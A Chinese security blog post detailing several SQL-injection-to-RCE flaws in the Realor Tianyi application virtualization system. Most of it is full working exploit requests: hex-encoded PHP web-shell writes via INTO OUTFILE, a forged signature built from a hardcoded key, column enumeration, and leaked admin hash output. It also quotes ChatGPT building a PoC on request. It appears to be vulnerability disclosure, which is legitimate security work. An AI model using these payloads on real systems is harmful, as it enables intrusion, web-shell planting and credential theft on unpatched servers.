---
created: 2024-10-01T09:05:00+00:00
categories:
  - 技术研究
tags:
  - 漏洞分析
updated: 2023-04-14T00:00:00+00:00
date: 2023-04-13T00:00:00+00:00
slug: realor-tianyi-multiple-sqli2rce
title: 瑞友天翼应用虚拟化系统多个SQLi2RCE漏洞
cover: https://www.notion.so/images/page-cover/gradients_3.png
id: 112906e1-7468-801d-9466-c5f6a022d3cb
---

## 0x00 漏洞简介

瑞友天翼应用虚拟化系统是西安瑞友信息技术资讯有限公司研发的具有自主知识产权，基于服务器计算(Server-based Computing)架构的应用虚拟化平台。它将用户各种应用软件（ERP/OA/CRM 等）集中部署在瑞友天翼服务器(群)上，客户端通过 WEB 即可快速安全的访问经服务器上授权的应用软件，实现集中应用、远程接入、协同办公等，从而为用户打造集中、便捷、安全、高效的虚拟化支撑平台。

瑞友天翼应用虚拟化系统存在多个 SQL 注入漏洞，攻击者可以通过 SQL 漏洞写入任意文件，进而达到执行任意代码。

## 0x01 影响版本

多个漏洞，以下前四个漏洞不影响目前最新 7.0.3.1 版本，最后一个漏洞影响 7.0.3.1 版本。

- `/Index/dologin/name`
  - 5.x <= version < 7.0.3.1
- `/Agent/GetBSAppUrl/AppID`
  - 5.x <= version < 7.0.3.1
- `RAPAgent.XGI`
  - 5.x <= version < 7.0.3.1
- `ConsoleExternalUploadApi.XGI`
  - 5.x <= version < 7.0.3.1
- `ConsoleExternalApi.XGI`
  - 5.x <= version <= 7.0.3.1

## 0x02 漏洞详情

### /Index/dologin/name

```text
GET /index.php?s=/Index/dologin/name/demo%27)%3bselect%20unhex%28%273c3f70687020246f7574707574203d20617272617928293b657865632827646972272c20246f7574707574293b666f72656163682028246f757470757420617320246c696e6529207b6563686f20246c696e65202e205048505f454f4c3b7d202466696c65203d205f5f46494c455f5f3b20756e6c696e6b282466696c65293b%27%29%20into%20outfile%20%27%2e%5C%5C%2e%2e%5C%5C%2e%2e%5C%5CWebRoot%5C%5CBMyY3q.XGI%27%23/pwd/123123 HTTP/1.1
Host: 192.168.21.89:8081
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Connection: close
Accept-Encoding: gzip, deflate


```

```text
GET /BMyY3q.XGI HTTP/1.1
Host: 192.168.21.89:8081
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Connection: close
Accept-Encoding: gzip, deflate


```

### /Agent/GetBSAppUrl/AppID

```text
GET /index.php?s=/Agent/GetBSAppUrl/AppID/1'%20and%20(extractvalue(1,concat(0x7e,(select%20md5(1)),0x7e)))%20and%20'a'='a HTTP/1.1
Host: 192.168.21.89:8081
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Connection: close
Accept-Encoding: gzip, deflate


```

```text
GET /index.php?s=/Agent/GetBSAppUrl/AppID/1')%3bselect%20unhex%28%273c3f70687020246f7574707574203d20617272617928293b657865632827646972272c20246f7574707574293b666f72656163682028246f757470757420617320246c696e6529207b6563686f20246c696e65202e205048505f454f4c3b7d202466696c65203d205f5f46494c455f5f3b20756e6c696e6b282466696c65293b%27%29%20into%20outfile%20%27%2e%5C%5C%2e%2e%5C%5C%2e%2e%5C%5CWebRoot%5C%5CBMyY3q.XGI%27%23/pwd/123123 HTTP/1.1
Host: 192.168.21.89:8081
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Connection: close
Accept-Encoding: gzip, deflate


```

### RAPAgent.XGI

```text
GET /RAPAgent.XGI?CMD=getApplication&AppID=APP00000001&User=admin&PWD=1&AuthType=0&Computer=1'%20union%20select%201%2c'asd213asd'%20into%20outfile%20'.%2f..%2f..%2fWebRoot%2fjs%2fasdxcfsea1.XGI'--%201' HTTP/1.1
Host: 192.168.21.89:8081
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Connection: close
Accept-Encoding: gzip, deflate


```

```text
HTTP/1.1 200 OK
Date: Wed, 12 Apr 2023 08:56:55 GMT
Server: Apache/2.4.10 (Win32) OpenSSL/1.0.2u-fips
Set-Cookie: PHPSESSID=3vtpsg3sk18cr6rgp1nvdmlbm7; path=/; HttpOnly
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 53
Connection: close
Content-Type: text/html; charset=UTF-8

[result]
result=2
MsgID=1
MsgDesc=ÓÃ»§Ãû»òÃÜÂë´íÎó
```

```text
GET /js/asdxcfsea1.XGI HTTP/1.1
Host: 192.168.21.89:8081
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Connection: close
Accept-Encoding: gzip, deflate


```

```text
HTTP/1.1 200 OK
Date: Wed, 12 Apr 2023 08:57:28 GMT
Server: Apache/2.4.10 (Win32) OpenSSL/1.0.2u-fips
Vary: Accept-Encoding
Content-Length: 12
Connection: close
Content-Type: text/html; charset=UTF-8

1	asd213asd

```

### ConsoleExternalUploadApi.XGI

```text
POST /ConsoleExternalUploadApi.XGI HTTP/1.1
Host: 192.168.21.89:8081
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 99

key=ServerIPType' union select 'test' into outfile '..\\\\..\\\\WebRoot\\\\js\\\\G8Sx6In.txt&initParams=x&sign=x
```

```text
POST /ConsoleExternalUploadApi.XGI?key=ServerIPType&initParams=command_uploadAuthorizeKeyFile__user_admin%27+or+%271%27=%271__pwd_2__serverIdStr_1&sign=8091edfafcf0936b64c7d7f2d7bb071f HTTP/1.1
Host: 192.168.21.89:8081
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=3vtpsg3sk18cr6rgp1nvdmlbm7; CookieLanguageName=ZH-CN
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundctaXAswKKlA
Content-Length: 390

------WebKitFormBoundctaXAswKKlA
Content-Disposition: form-data; name="keyFile"; filename="sess_cf1.key"
Content-Type: image/png

0|1|2|a:1:{s:7:"user_id";s:169:"1') Union Select 'asdasd',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL into outfile '..\\\\..\\\\WebRoot\\\\agasd.txt' -- ";}
------WebKitFormBoundctaXAswKKlA--
```

```text
POST /index.php HTTP/1.1
Host: 192.168.21.89:8081
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
Referer: <http://192.168.21.89:8081/index.php?s=/Admin/userlist>
Accept-Encoding: gzip, deflate
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
Cookie: think_language=en; PHPSESSID=3vtpsg3sk18cr6rgp1nvdmlbm7; UserAuthtype=0; CookieLanguageName=ZH-CN
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 29

s=/Index/index&sessId=cf1.key
```

### ConsoleExternalApi.XGI

### 漏洞分析

关键代码如下，已省略部分无关代码。

```php
$initparams = $_REQUEST['initParams'];
$key = $_REQUEST['key'];
$sign = $_REQUEST['sign'];
//testLog('kaitou1=' . $initparams);
if (stripos($initparams, "exePath_") > 1) {
    $paramArr = explode("__", $initparams);
//    testLog($paramArr);
    if ($paramArr) {
        $i = 0;
        for (; $i < sizeof($paramArr); $i++) {
//            testLog(stripos($paramArr[$i],"exePath_"));
            if (stripos($paramArr[$i], "_") > 1) {
                $paramArrTmp = explode("_", $paramArr[$i]);
//                testLog($paramArrTmp);
                if (in_array("exePath", $paramArrTmp)) {
//                    testLog('yuan1=' . $paramArrTmp[1]);
                    if (sizeof($paramArrTmp) > 1) {
                        $b = 0;
                        for (; $b < count($paramArrTmp); ++$b) {
                            if ($b > 0) {
                                $paramArrTmp[$b] = urlencode($paramArrTmp[$b]);
                            }
                        }
                    }
                    $paramArr[$i] = implode("_", $paramArrTmp);
//                    testLog("lianJie=" . $paramArr[$i] . '---yuan2=' . $paramArrTmp[1]);
                }
            }
        }

    }
//    testLog($paramArr);
    $initparams = implode("__", $paramArr);
//    testLog('kaitou2=' . $initparams);
}
if (!isset($initparams) || $initparams == "" || !isset($key) || $key == "" || !isset($sign) || $sign == "") {
    exitErrorJson('参数非法');
}
//testLog($initparams);
$COMCASWEB = new main();

if ($key == "wusuokey") {
    $keyVal = $COMCASWEB->getfarminfo($key);
} else if ($key == "inner") {
    $keyVal = "Realor";
}

if (!isset($keyVal) || empty($keyVal)) {
    write_log("{'参数非法':'key值为空'}");
    exitErrorJson('参数非法');
}
$signCalculate = md5($initparams . $keyVal);
//testLog("signCalculate=" . $signCalculate);
if ($signCalculate != $sign) {
    write_log("{'参数非法':'参数加密方法错误'}");
    exitErrorJson('参数非法');
}

$paramArr = explode("__", $initparams);
if (count($paramArr) == 0) {
    write_log("{'参数非法':'参数中未包含__'}");
    exitErrorJson('参数非法11');
}

$requestObj = null;
//testLog($paramArr);
foreach ($paramArr as $key => $value) {
    $keyValue = explode("_", $value);
    $requestObj[$keyValue[0]] = $keyValue[1];
}

$DSCon = creatconniction("DS");
if ($DSCon == -1) {
    write_log("{'连接错误':'数据库创建链接失败'}");
    exitErrorJson('创建数据库链接失败');
}

$cmd = $requestObj['command'];
$adminName = $requestObj['user'];
$adminName = utf8ToGbk($adminName);
$adminPwd = $requestObj['pwd'];
//testLog($requestObj);

// ...

if ($cmd == "createUser") {
    $POST_JSON = json_decode($HTTP_RAW_POST_DATA, true);
    $fId = getDefaultVal($POST_JSON['userGroupId'], getAdminGroupId());
    $account = $POST_JSON['account'];

    if (!isset($account) || empty($account)) {
        write_log("{'createUser':'用户账户不可为空'}");
        exitErrorJson('用户账号不可为空');
    }
    $account = utf8ToGbk($account);

    $userPwd = $POST_JSON['userPwd'];
    if (!isset($userPwd) || empty($userPwd)) {
        write_log("{'createUser':'用户密码不可为空'}");
        exitErrorJson('用户密码不可为空');
    }
    //账号是否已存在
    $result = mysql_query("select * from cuser where name='" . $account . "'", $DSCon);

    if (mysql_num_rows($result) == 1) {
        write_log("{'createUser':'要添加的账户'.$account.'已存在'}");
        exitErrorJson('要添加的账户已存在！');
    }

  	// ...
}
```

将如上代码进行优化，删除多余的注释和无关紧要的判断后，将优化后的代码交给 ChatGPT 去阅读理解，如下是与 ChatGPT 的对话。

> 问：如上 PHP 代码中存在一个 SQL 盲注入漏洞，请阅读理解如上 PHP 代码，并构造出一个最佳的 POC。注意 HTTP 请求的 Content-Type 为 application/json。

> 答：要对这段代码进行 SQL 盲注攻击，我们需要关注$cmd == "createUser"条件下的代码。在这个条件下，我们可以看到有一个SQL查询，它使用$account 作为查询的一部分。$account变量是从$POST_JSON['account']获取的，它在 HTTP 请求中以 JSON 格式发送。

    由于Content-Type为application/json，我们需要构造一个包含恶意`account`值的JSON格式的POST请求。在这个例子中，我们将使用双引号来终止当前的字符串，并使用`OR`语句注入额外的条件，使查询始终返回至少一行结果。


    例如，可以尝试使用以下`account`值：


    ```text
    "test\\" OR \\"1\\"=\\"1"
    ```


    当这个值被插入到SQL查询中时，查询将变成：


    ```text
    select * from cuser where name='test" OR "1"="1'
    ```


    由于`"1"="1"`始终为真，这将使查询返回所有行，从而使`mysql_num_rows($result) == 1`成立，导致输出错误消息“要添加的账户已存在！”。这表明成功执行了SQL盲注攻击。


    要构造一个POC，我们需要发送一个POST请求，包含以下数据：


    ```text
    POST /your_script.php HTTP/1.1
    Host: target_site.com
    Content-Type: application/json
    Content-Length: ...

    {"account": "test\\" OR \\"1\\"=\\"1","userPwd": "any_password","userGroupId": "any_group_id"}
    ```


    这个POST请求将在目标站点上触发该SQL盲注漏洞。为了防止这类SQL注入攻击，建议使用预处理语句和参数化查询，以及更新的数据库扩展，如`mysqli`或`PDO`。

> 问：请基于如上 POC 进行改进，注意 PHP 代码中的几个参数：key、initParams、sign，提示这三个参数在 POST 请求的位置不位于 body 部分，而是位于 URI 位置。

> 答：根据提示，我们需要将 key、initParams 和 sign 参数放在 URI 中，并将 account、userPwd 和 userGroupId 放在请求的 body 部分。这里是一个改进后的 POC，其中包含了 initParams、key 和 sign 参数在 URI 中的设置。

    假设我们已经知道`key`的值为`inner`，这意味着`keyVal`为`Realor`，并且已经获取了合适的`initParams`。为了生成`sign`值，我们需要计算`md5($initparams . $keyVal)`。


    以下是一个包含`initParams`、`key`和`sign`参数的示例URI：


    ```text
    /your_script.php?initParams=command_createUser__user_admin__pwd_password&key=inner&sign=5f1c9d2d2b3a7e1e23b8e767c53d12f6
    ```


    现在我们需要构造一个包含恶意`account`值的JSON格式的POST请求：


    ```text
    POST /your_script.php?initParams=command_createUser__user_admin__pwd_password&key=inner&sign=5f1c9d2d2b3a7e1e23b8e767c53d12f6 HTTP/1.1
    Host: target_site.com
    Content-Type: application/json
    Content-Length: ...

    {"account": "test\\" OR \\"1\\"=\\"1","userPwd": "any_password","userGroupId": "any_group_id"}
    ```


    这个POST请求将在目标站点上触发该SQL盲注漏洞。为了防止这类SQL注入攻击，建议使用预处理语句和参数化查询，以及更新的数据库扩展，如`mysqli`或`PDO`。

> 点评：ChatGPT 回答的效果取决于提问者提出问题的质量，学会提问，能够清晰地表述自己的问题这是一个关键。如上回答已经很接近正式的 POC 了，至少它将 initParams 参数给构造出来了。

### 漏洞利用

那么使用 ChatGPT 作为辅助再结合人本身的能力，可以较为轻松地分析构造出真正的 POC。

首先需要说明的是，该漏洞目前影响最新 7.0.3.1 版本，如下请求可以获取版本号。

```text
GET /RAPAgent.XGI?CMD=GetClientExeVer HTTP/1.1
Host: 192.168.21.89:8081
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Accept: application/json
Accept-Encoding: gzip


```

```text
HTTP/1.1 200 OK
Date: Fri, 14 Apr 2023 11:25:41 GMT
Server: Apache
Set-Cookie: PHPSESSID=n0hbfs5jlf6ca759lv5l4nstv1; path=/; HttpOnly
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Content-Length: 35
Content-Type: text/html

[result]
result=0
Version=7.0.3.1
```

先计算`sign`的值。

```shell
$ keyVal="Realor"
$ initParams="command_createUser__user_admin__pwd_123"
$ echo -n $initParams$keyVal | md5
455bb32c0eb81692d75438a140c166e4
```

然后构造如下 POC 内容，先使用`ORDER BY`语句确认列数，如下结果测试于 7.0.3.1 版本，其列数是 31，但在 7.0.2.1 版本中测试得出列数为 32。

```text
POST /ConsoleExternalApi.XGI?key=inner&initParams=command_createUser__user_admin__pwd_123&sign=455bb32c0eb81692d75438a140c166e4 HTTP/1.1
Host: 192.168.21.89:8081
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Accept: application/json
Content-Type: application/json
Cookie: PHPSESSID=60ql548qeb56e9tvsjo1mjnnq5; CookieLanguageName=ZH-CN; think_languague=zh-CN; UserAuthtype=0
Accept-Encoding: gzip, deflate
Referer: http:// 192.168.21.89:8081/ConsoleExternalApi.XGI
Content-Length: 53
Connection: close

{"account":"admin' ORDER BY 31-- -", "userPwd":"123"}
```

```text
HTTP/1.1 200 OK
Date: Fri, 14 Apr 2023 11:31:10 GMT
Server: Apache
Content-Length: 51
Connection: close
Content-Type: application/json; charset=utf-8

{"result":0,"msg":"要添加的账户已存在！"}
```

```text
POST /ConsoleExternalApi.XGI?key=inner&initParams=command_createUser__user_admin__pwd_123&sign=455bb32c0eb81692d75438a140c166e4 HTTP/1.1
Host: 192.168.21.89:8081
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Accept: application/json
Content-Type: application/json
Cookie: PHPSESSID=60ql548qeb56e9tvsjo1mjnnq5; CookieLanguageName=ZH-CN; think_languague=zh-CN; UserAuthtype=0
Accept-Encoding: gzip, deflate
Referer: http://192.168.21.89:8081/ConsoleExternalApi.XGI
Content-Length: 53
Connection: close

{"account":"admin' ORDER BY 32-- -", "userPwd":"123"}
```

```text
HTTP/1.1 200 OK
Date: Fri, 14 Apr 2023 11:31:21 GMT
Server: Apache
Content-Length: 45
Connection: close
Content-Type: application/json; charset=utf-8

{"result":0,"msg":"添加用户数据失败"}
```

那么接下来就可以直接`INTO OUTFILE`写文件了。

```text
POST /ConsoleExternalApi.XGI?key=inner&initParams=command_createUser__user_admin__pwd_123&sign=455bb32c0eb81692d75438a140c166e4 HTTP/1.1
Host: 192.168.21.89:8081
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Accept: application/json
Content-Type: application/json
Cookie: PHPSESSID=60ql548qeb56e9tvsjo1mjnnq5; CookieLanguageName=ZH-CN; think_languague=zh-CN; UserAuthtype=0
Accept-Encoding: gzip, deflate
Referer: http://192.168.21.89:8081/ConsoleExternalApi.XGI
Content-Length: 270
Connection: close

{"account":"admin' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'D7UFszUIaH8TOo' into outfile './../../WebRoot/js/D7-UFs.txt'-- -", "userPwd":"123"}
```

```text
HTTP/1.1 200 OK
Date: Fri, 14 Apr 2023 11:31:34 GMT
Server: Apache
Content-Length: 45
Connection: close
Content-Type: application/json; charset=utf-8

{"result":0,"msg":"添加用户数据失败"}
```

最后成功验证。

```text
GET /js/D7-UFs.txt HTTP/1.1
Host: 192.168.21.89:8081
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36
Connection: close
Cache-Control: max-age=0


```

```text
HTTP/1.1 200 OK
Date: Fri, 14 Apr 2023 11:32:29 GMT
Server: Apache
Last-Modified: Fri, 14 Apr 2023 11:31:34 GMT
ETag: "db50000000dc875-133-5f94a2ef6444a"
Accept-Ranges: bytes
Content-Length: 307
Connection: close
Content-Type: text/plain

usr00000001	Admin	0	1	usr00000002	202cb962ac59075b964b07152d234b70	SrookgZ6qtg=	SprIrCtPWPOw9o9Ok1DJgJIJLZY=	ZB4SodE3MowGSAPseW1O	\\N	1	\\N	\\N	2023-03-15	2	\\N	\\N	0	\\N	\\N	\\N	\\N	\\N	\\N	0	0	\\N	100000	\\N	0	\\N
\\N	\\N	\\N	\\N	\\N	\\N	\\N	\\N	\\N	\\N	\\N	\\N	\\N	\\N	\\N	\\N	\\N	\\N	\\N	\\N	\\N	\\N	\\N	\\N	\\N	\\N	\\N	\\N	\\N	\\N	D7UFszUIaH8TOo

```
